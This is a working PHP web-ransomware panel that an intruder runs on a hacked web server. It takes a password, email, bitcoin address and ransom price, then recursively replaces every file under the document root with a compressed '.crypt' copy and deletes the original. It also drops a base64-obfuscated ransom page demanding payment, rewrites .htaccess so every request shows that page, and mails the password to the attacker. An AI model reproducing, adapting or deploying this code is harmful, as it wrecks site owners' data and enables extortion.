<title>Fadly 31337 Ransomware</title>
<link rel="shortcut icon" type="image/x-icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
<style>
html {
background: black;
color: white;
}
input { background: transparent; color: white; border: 1px solid white; }
</style>
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.crypt') !== false) {
    return;
	}
	file_put_contents($filename.".crypt", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
copy('.htaccess','.htabackup');
$file = base64_decode("PHRpdGxlPldoMDBwenouLjwvdGl0bGU+DQo8bWV0YSBuYW1lPSJvZzppbWFnZSIgY29udGVudD0iaHR0cDovL3pvbmVobWlycm9ycy5vcmcvZGVmYWNlZC8yMDIwLzA2LzI3L2FsZmFyc2lzYWlkLmNvbS9wMC5waXFzZWxzLmNvbS9wcmV2aWV3Lzk4Mi82MzYvNS9ibGFjay1hbmQtd2hpdGUtYmxhY2stYW5kLXdoaXRlLWRlcHJlc3Npb24tZmVhci5qcGciPg0KPHN0eWxlPg0KaHRtbCB7DQpiYWNrZ3JvdW5kOiBibGFjazsNCmNvbG9yOiB3aGl0ZTsNCn0NCmlucHV0IHsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGNvbG9yOiB3aGl0ZTsgYm9yZGVyOiAxcHggc29saWQgd2hpdGU7IH0NCjwvc3R5bGU+DQo8P3BocA0KZXJyb3JfcmVwb3J0aW5nKDApOw0KJGlucHV0ID0gJF9QT1NUWydwYXNzJ107DQokcGFzcyA9ICJqYW5jb2tqYXJhbiI7DQppZihpc3NldCgkaW5wdXQpKSB7DQppZihtZDUoJGlucHV0KSA9PSAkcGFzcykgew0KZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpew0KCWlmIChzdHJwb3MoJGZpbGVuYW1lLCAnLmNyeXB0JykgPT09IEZBTFNFKSB7DQoJcmV0dXJuOw0KCX0NCgkkZGVjcnlwdGVkID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlbmFtZSkpOw0KCWZpbGVfcHV0X2NvbnRlbnRzKHN0cl9yZXBsYWNlKCcuY3J5cHQnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7DQoJdW5saW5rKCdjcnlwdC5waHAnKTsNCgl1bmxpbmsoJy5odGFjY2VzcycpOw0KCXVubGluaygkZmlsZW5hbWUpOw0KCWVjaG8gIiRmaWxlbmFtZSBEZWNyeXB0ZWQgISEhPGJyPiI7DQp9DQoNCmZ1bmN0aW9uIGRlY2RpcigkZGlyKXsNCgkkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpciksIGFycmF5KCcuJywgJy4uJykpOw0KCQlmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSkgew0KCQkJaWYoaXNfZGlyKCRkaXIuIi8iLiRmaWxlKSl7DQoJCQkJZGVjZGlyKCRkaXIuIi8iLiRmaWxlKTsNCgkJCX1lbHNlIHsNCgkJCQlkZWNmaWxlKCRkaXIuIi8iLiRmaWxlKTsNCgkJfQ0KCX0NCn0NCg0KZGVjZGlyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10pOw0KZWNobyAiPGJyPldlYnJvb3QgRGVjcnlwdGVkPGJyPiI7DQp1bmxpbmsoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOw0KdW5saW5rKCcuaHRhY2Nlc3MnKTsNCmNvcHkoJ2h0YWJhY2t1cCcsJy5odGFjY2VzcycpOw0KZWNobyAnU3VjY2VzcyAhISEnOw0KfSBlbHNlIHsNCmVjaG8gJ0ZhaWxlZCBQYXNzd29yZCAhISEnOw0KfQ0KZXhpdCgpOw0KfQ0KPz4NCjxjZW50ZXI+PGJyPg0KPGltZyBzcmM9Imh0dHA6Ly96b25laG1pcnJvcnMub3JnL2RlZmFjZWQvMjAyMC8wNi8yNy9hbGZhcnNpc2FpZC5jb20vcDAucGlxc2Vscy5jb20vcHJldmlldy85ODIvNjM2LzUvYmxhY2stYW5kLXdoaXRlLWJsYWNrLWFuZC13aGl0ZS1kZXByZXNzaW9uLWZlYXIuanBnIiB3aWR0aD0iNDAlIj48YnI+DQo8aDE+V2gwMHB6enouLi48L2gxPg0KPHNwYW4gc3R5bGU9J2ZvbnQtc2l6ZToyMnB4Oyc+IkRvbid0IENoYW5nZSB0aGUgRmlsZW5hbWUgYmVjYXVzZSBpdCBDYW4gRGFtYWdlIHRoZSBGaWxlIElmIFlvdSBXYW50IHRvIFJldHVybiBZb3UgTXVzdCBFbnRlciB0aGUgUGFzc3dvcmQgRmlyc3Q8YnI+DQpTZW5kIE1lICQzIEZvciBCYWNrIFlvdXIgV2Vic2l0ZS4iPC9zcGFuPjxicj48YnI+DQpCaXRjb2luIEFkZHJlc3MgOiA8aW5wdXQgdHlwZT0idGV4dCIgdmFsdWU9ImtvbnRvbGFuamluZyIgcmVhZG9ubHk+DQo8YnI+PGJyPg0KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRGVjcnlwdCI+PGJyPjxicj4NCkNvbnRhY3QgbWU/IHN5bmRyb21lLnBhdGFoLmhhdGlAZ21haWwuY29tDQo8L2Zvcm0+");
$q = str_replace('jancokjaran', md5($_POST['pass']), $file);
$w = str_replace('syndrome.patah.hati@gmail.com', $_POST['email'], $q);
$e = str_replace('kontolanjing', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('crypt.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex crypt.php\n
ErrorDocument 403 /crypt.php\n
ErrorDocument 404 /crypt.php\n
ErrorDocument 500 /crypt.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Encrypted !!!<br>";
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}

if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('crypt.php', $_SERVER['DOCUMENT_ROOT'].'/crypt.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$to = $_POST['email'];
$subject = 'Your Ransomware Info';
$message = "Domain : ".$_SERVER['HTTP_ADDR']."\n\n"."Your Password : ".$_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>
<center>
<h1>[!] Ransomware [!]</h1>
<br><br><h3>Information Server :</h3>
Path File : <font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function : <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : <font color="red"><?php if(mail('syndrome.patah.hati@gmail.com','tes')) { echo "ON"; } else { echo "OFF"; } ?></font>
<br><Br>
<form enctype="multipart/form-data" method="post">
Password Encrypt : <input type="text" name="pass"> Your Email : <input type="text" name="email">
<br><br>
Your Bitcoin Address : <input type="text" name="btc"> Your Price : <input type="text" name="price">
<br><br>
<input type="submit" value="Encrypt">
</form>